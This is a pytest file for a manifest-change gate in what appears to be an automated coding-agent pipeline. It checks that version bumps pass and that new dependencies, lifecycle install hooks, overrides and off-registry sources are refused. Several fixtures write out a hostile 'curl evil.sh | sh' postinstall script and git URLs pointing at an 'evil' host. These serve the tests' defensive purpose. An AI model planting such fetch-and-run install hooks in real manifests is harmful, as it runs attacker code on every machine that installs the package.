"""Tests for the manifest rule — `temporal.taskauto.manifests` and G6b.

The rule replaces a path deny-list that refused every manifest change,
including the version bumps that make up most of them. So there are two
things to prove and they pull in opposite directions: the bookkeeping that
used to stall must now land, and everything that made the deny-list worth
having must still be refused.

The case that motivated it is `test_the_watchparty_139_diff_would_have_landed`.
"""

from __future__ import annotations

import json

import pytest

from temporal.gates import TASK_AUTOMATION, registry_snapshot, run_gates
from temporal.gates.taskauto.manifest_deps import dependencies_unchanged
from temporal.taskauto.manifests import (
    classify_diff,
    classify_files,
    classify_lockfile,
    classify_package_json,
    classify_requirements,
    looks_like_dependency_spec,
)
from temporal.taskauto.refs import RepoPolicy, TaskRef


def pkg(**over) -> str:
    base = {
        "name": "@wolffm/watchparty-ui",
        "version": "0.38.65",
        "scripts": {"build": "vite build", "typecheck": "tsc --noEmit"},
        "dependencies": {"react": "^19.0.0", "@wolffm/themes": "^5.6.2"},
    }
    base.update(over)
    return json.dumps(base, indent=2)


# ── package.json, both sides in hand ──────────────────────────────────────


def test_a_version_bump_is_bookkeeping():
    r = classify_package_json(pkg(), pkg(version="0.38.66"))
    assert r.ok, r.reason


def test_a_range_bump_on_a_dependency_already_there_lands():
    r = classify_package_json(
        pkg(), pkg(dependencies={"react": "^19.0.0",
                                 "@wolffm/themes": "^5.7.0"}))
    assert r.ok, r.reason


def test_a_new_dependency_is_refused():
    r = classify_package_json(
        pkg(), pkg(dependencies={"react": "^19.0.0",
                                 "@wolffm/themes": "^5.6.2",
                                 "left-pad": "^1.3.0"}))
    assert not r.ok
    assert "new dependency" in r.reason
    assert "left-pad" in r.reason


def test_a_removed_dependency_is_refused():
    r = classify_package_json(pkg(), pkg(dependencies={"react": "^19.0.0"}))
    assert not r.ok
    assert "removed" in r.reason


def test_retargeting_a_dependency_outside_the_registry_is_refused():
    """The name and the range are unchanged; only where it resolves from."""
    r = classify_package_json(
        pkg(), pkg(dependencies={"react": "^19.0.0",
                                 "@wolffm/themes": "git+ssh://git@evil/x.git"}))
    assert not r.ok
    assert "outside the registry" in r.reason


def test_an_ordinary_script_may_be_added():
    """The whole point of the change — this is the icons gate wiring."""
    r = classify_package_json(
        pkg(), pkg(scripts={"build": "vite build", "typecheck": "tsc --noEmit",
                            "lint:icons": "hadoku-check-icons ."}))
    assert r.ok, r.reason


@pytest.mark.parametrize("key", [
    "postinstall", "preinstall", "install", "prepare", "prepublishOnly",
])
def test_a_lifecycle_script_is_refused(key):
    """These run on every install, on a laptop and in CI. An agent that can
    add one has arbitrary code execution on anyone who pulls."""
    r = classify_package_json(
        pkg(), pkg(scripts={"build": "vite build", key: "curl evil.sh | sh"}))
    assert not r.ok
    assert "lifecycle" in r.reason


@pytest.mark.parametrize("field,value", [
    ("overrides", {"lodash": "1.0.0"}),
    ("resolutions", {"lodash": "1.0.0"}),
    ("packageManager", "pnpm@9.0.0"),
    ("pnpm", {"onlyBuiltDependencies": ["esbuild"]}),
    ("pnpm", {"patchedDependencies": {"react@19.0.0": "patches/react.patch"}}),
])
def test_resolution_overrides_are_refused(field, value):
    """They change what a dependency resolves to, or let it run build
    scripts, without the dependency list moving at all."""
    r = classify_package_json(pkg(), pkg(**{field: value}))
    assert not r.ok, f"{field} should be refused"


def test_unparseable_json_fails_closed():
    r = classify_package_json(pkg(), "{not json")
    assert not r.ok
    assert "could not parse" in r.reason


def test_an_added_manifest_is_refused():
    r = classify_files({"apps/new/package.json": (None, pkg())})
    assert not r.ok
    assert "added" in r.reason


# ── lockfiles ─────────────────────────────────────────────────────────────


OLD_LOCK = """
packages:
  '@wolffm/themes@5.6.2':
    resolution: {integrity: sha512-aaa}
  react@19.0.0:
    resolution: {integrity: sha512-bbb}
"""


def test_a_lockfile_moving_versions_of_packages_it_had_is_fine():
    new = OLD_LOCK.replace("react@19.0.0", "react@19.0.1")
    assert classify_lockfile(OLD_LOCK, new).ok


def test_a_lockfile_gaining_a_package_is_refused():
    new = OLD_LOCK + "  left-pad@1.3.0:\n    resolution: {integrity: sha512-c}\n"
    r = classify_lockfile(OLD_LOCK, new)
    assert not r.ok
    assert "left-pad" in r.reason


def test_a_lockfile_gaining_a_first_party_package_is_fine():
    """`@wolffm/*` is ours and the auto-update bot moves it constantly; it is
    not a third party arriving."""
    new = OLD_LOCK + "  '@wolffm/task-ui-components@4.7.1':\n    resolution: {integrity: sha512-d}\n"
    assert classify_lockfile(OLD_LOCK, new).ok


# ── requirements.txt ──────────────────────────────────────────────────────


def test_requirements_version_bump_is_fine():
    assert classify_requirements("flask==3.0.0\n", "flask==3.0.1\n").ok


def test_requirements_gaining_a_package_is_refused():
    r = classify_requirements("flask==3.0.0\n", "flask==3.0.0\nrequests==2.0\n")
    assert not r.ok
    assert "requests" in r.reason


def test_requirements_pointing_at_a_url_is_refused():
    r = classify_requirements("flask==3.0.0\n",
                              "flask==3.0.0\ngit+https://evil/x.git\n")
    assert not r.ok


# ── the diff-only form (what a gate can see) ──────────────────────────────


WATCHPARTY_139 = """diff --git a/apps/ui/package.json b/apps/ui/package.json
--- a/apps/ui/package.json
+++ b/apps/ui/package.json
@@ -2,7 +2,7 @@
   "name": "@wolffm/watchparty-ui",
-  "version": "0.38.65",
+  "version": "0.38.66",
@@ -20,7 +20,8 @@
-    "typecheck": "tsc -p tsconfig.json --noEmit"
+    "typecheck": "tsc -p tsconfig.json --noEmit",
+    "lint:icons": "hadoku-check-icons ."
@@ -30,7 +31,7 @@
-    "@wolffm/themes": "^5.6.2",
+    "@wolffm/themes": "^5.7.0",
diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml
--- a/pnpm-lock.yaml
+++ b/pnpm-lock.yaml
@@ -10,7 +10,7 @@
-  '@wolffm/themes@5.6.2':
+  '@wolffm/themes@5.7.0':
     resolution: {integrity: sha512-aaa}
"""


def test_the_watchparty_139_diff_would_have_landed():
    """The case this exists for. A version bump, a range bump on a dependency
    already present, a lockfile touching only what it had, and a new
    non-lifecycle script — refused by the old path rule, and then written by
    hand instead."""
    r = classify_diff(WATCHPARTY_139, ["apps/ui/package.json", "pnpm-lock.yaml"])
    assert r.ok, r.reason


def test_a_new_dependency_in_a_diff_is_refused():
    diff = """diff --git a/package.json b/package.json
+++ b/package.json
@@ -5,6 +5,7 @@
     "react": "^19.0.0",
+    "left-pad": "^1.3.0",
"""
    r = classify_diff(diff, ["package.json"])
    assert not r.ok
    assert "left-pad" in r.reason


def test_a_lifecycle_script_in_a_diff_is_refused():
    """Caught by the key's NAME, so it does not matter that a hunk rarely
    shows the enclosing `"scripts": {`."""
    diff = """diff --git a/package.json b/package.json
+++ b/package.json
@@ -5,6 +5,7 @@
     "build": "vite build",
+    "postinstall": "curl evil.sh | sh",
"""
    r = classify_diff(diff, ["package.json"])
    assert not r.ok
    assert "lifecycle" in r.reason


def test_a_diff_line_it_cannot_read_fails_closed():
    diff = """diff --git a/package.json b/package.json
+++ b/package.json
@@ -5,6 +5,7 @@
+    this is not a json field at all
"""
    r = classify_diff(diff, ["package.json"])
    assert not r.ok
    assert "cannot be judged" in r.reason


def test_a_manifest_missing_from_the_diff_fails_closed():
    """Reported as touched, absent from the diff: the one thing that must not
    be read as "nothing happened"."""
    r = classify_diff(WATCHPARTY_139, ["packages/shared/package.json"])
    assert not r.ok
    assert "not present in the diff" in r.reason


@pytest.mark.parametrize("value,is_dep", [
    ("^1.2.3", True), ("~1.0", True), ("1.x", True), ("*", True),
    ("workspace:*", True), ("git+ssh://git@host/x.git", True),
    ("hadoku-check-icons .", False), ("vite build", False),
    ("tsc -p tsconfig.json --noEmit", False),
])
def test_value_shape_tells_a_dependency_from_a_script(value, is_dep):
    assert looks_like_dependency_spec(value) is is_dep


# ── the gate ──────────────────────────────────────────────────────────────


class Ev:
    def __init__(self, files, diff="", *, explode_diff=False):
        self.files = files
        self.diff = diff
        self.explode_diff = explode_diff

    def read_text(self, path):
        if path == "05-fixed/files_touched.txt":
            return "\n".join(self.files)
        if path == "05-fixed/diff.patch":
            if self.explode_diff:
                raise OSError("disk gone")
            return self.diff
        raise AssertionError(f"unexpected read: {path}")

    def write_json(self, *a, **k):
        pass


def ref(title="a task", notes=""):
    return TaskRef(repo_slug="WolffM/hadoku-watchparty", board="h1",
                   task_id="t1", title=title, notes_at_claim=notes,
                   policy=RepoPolicy())


def test_the_gate_passes_the_bookkeeping_diff():
    r = dependencies_unchanged(
        ref(), Ev(["apps/ui/package.json", "pnpm-lock.yaml"], WATCHPARTY_139))
    assert r.verdict == "pass", r.reason


def test_the_gate_ignores_a_diff_with_no_manifests():
    r = dependencies_unchanged(ref(), Ev(["src/App.tsx"], ""))
    assert r.verdict == "pass"


def test_the_gate_fails_when_a_manifest_changed_but_the_diff_is_unreadable():
    """The one thing it exists to rule out is "a manifest changed and I could
    not see how"."""
    r = dependencies_unchanged(
        ref(), Ev(["package.json"], explode_diff=True))
    assert r.verdict == "fail"
    assert "could not be read" in r.reason


def test_allow_protected_still_authorises_a_manifest():
    r = dependencies_unchanged(
        ref(title="add the sdk allow-protected: package.json"),
        Ev(["package.json"], "no diff needed"))
    assert r.verdict == "pass"


def test_the_agents_own_notes_cannot_authorise_a_manifest():
    r = dependencies_unchanged(
        ref(notes="the human's original request"),
        Ev(["package.json"], """diff --git a/package.json b/package.json
+++ b/package.json
@@ -5,6 +5,7 @@
+    "left-pad": "^1.3.0",
"""))
    assert r.verdict == "fail"


def test_registers_under_task_automation_only():
    entries = [(p, after, name) for p, after, _, name in registry_snapshot()
               if name == "dependencies_unchanged"]
    assert entries == [(TASK_AUTOMATION, "fixed", "dependencies_unchanged")]


def test_crimson_kitty_never_runs_this_gate():
    results = run_gates("fixed", ref(), Ev(["package.json"], ""),
                        pipeline="crimson-kitty")
    assert "dependencies_unchanged" not in [r.name for r in results]
